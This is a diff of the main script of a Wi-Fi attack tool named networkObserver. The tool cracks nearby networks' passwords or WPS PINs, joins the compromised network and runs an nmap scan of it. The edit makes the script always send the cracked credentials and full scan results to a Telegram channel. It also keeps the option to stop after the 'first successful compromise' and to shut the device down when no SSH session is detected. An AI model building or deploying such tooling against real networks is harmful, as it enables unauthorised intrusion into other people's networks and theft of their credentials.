@@ -1,7 +1,17 @@
 import os
 import time
 import logging
-from utils import clean_files, setup_logging, is_ssh_connected, has_internet, wait_for_time_sync
+from utils import (
+    clean_files,
+    setup_logging,
+    wait_for_time_sync,
+    is_ssh_connected
+)
+from wifi_scan import scan_targets
+from wifi_attack import attack_target
+from wifi_connect import connect_to_wifi, delete_all_wifi_connections
+from send_to_telegram import send_message
+from nmap_scan import run_nmap_scan, get_wifi_ip, clean_nmap_output
 from constants import (
     TARGETS_FILE,
     CRACKED_FILE,
@@ -11,30 +21,26 @@ from constants import (
     MAX_RUNTIME,
     ENABLE_NMAP_SCAN
 )
-from wifi_scan import scan_targets
-from wifi_attack import attack_target
-from wifi_connect import connect_to_wifi, delete_all_wifi_connections
-from send_to_telegram import send_message
-from nmap_scan import run_nmap_scan, get_wifi_ip, clean_nmap_output
 
-global_start_time = time.time()
 
 # Ensure logs directory exists + configure logging
 setup_logging()
 logging.info("Starting networkObserver")
 
-# Synchronize time with NTP
+# Wait for NTP time synchronization
 wait_for_time_sync()
 logging.info("Time was synchronized with NTP.")
 
-# Clean up any lingering Wi-Fi connections before scan
+# Set global timer after time sync
+global_start_time = time.time()
+
+# Clean up Wi-Fi state
 delete_all_wifi_connections()
 logging.info("Disconnected all previous Wi-Fi connections.")
 
 # Clean temp files
 clean_files(TARGETS_FILE, CRACKED_FILE, PCAP_FILE)
 logging.info("Temporary files cleaned.")
-
 
 # Scan for targets
 targets = scan_targets(ATTACK_INTERFACE)
@@ -56,21 +62,20 @@ while targets:
                 msg += f"\nPassword: {result['psk']}"
             elif result.get("pin"):
                 msg += f"\nWPS PIN: {result['pin']}"
-            if has_internet():
-                logging.info("Connection successful. Sending to Telegram...")
-                send_message(msg)
-                if ENABLE_NMAP_SCAN:
-                    ip = get_wifi_ip(ATTACK_INTERFACE)
-                    if ip:
-                        logging.info(f"Running nmap scan on internal network: {ip}")
-                        nmap_result = run_nmap_scan(ip)
-                        if nmap_result:
-                            cleaned_output = clean_nmap_output(nmap_result)
-                            send_message(f"[nmap scan result]\n```{cleaned_output[:4000]}```")
-                    else:
-                        logging.warning("No IP assigned to wlan0. Skipping nmap scan.")
-            else:
-                logging.warning("Connected, but no internet. Skipping Telegram message.")
+
+            send_message(msg)
+
+            if ENABLE_NMAP_SCAN:
+                ip = get_wifi_ip(ATTACK_INTERFACE)
+                if ip:
+                    logging.info(f"Running nmap scan on internal network: {ip}")
+                    nmap_result = run_nmap_scan(ip)
+                    if nmap_result:
+                        cleaned_output = clean_nmap_output(nmap_result)
+                        send_message(f"[nmap scan result]\n```{cleaned_output}```")
+                else:
+                    logging.warning("No IP assigned to interface. Skipping nmap scan.")
+
             if STOP_ON_SUCCESS:
                 logging.info("Stopping after first successful compromise (as per config).")
                 break
@@ -81,7 +86,7 @@ while targets:
 
 logging.info("Process completed.")
 
-# Shutdown logic
+# Shutdown if no SSH
 if is_ssh_connected():
     logging.info("SSH session detected. Skipping shutdown.")
 else:
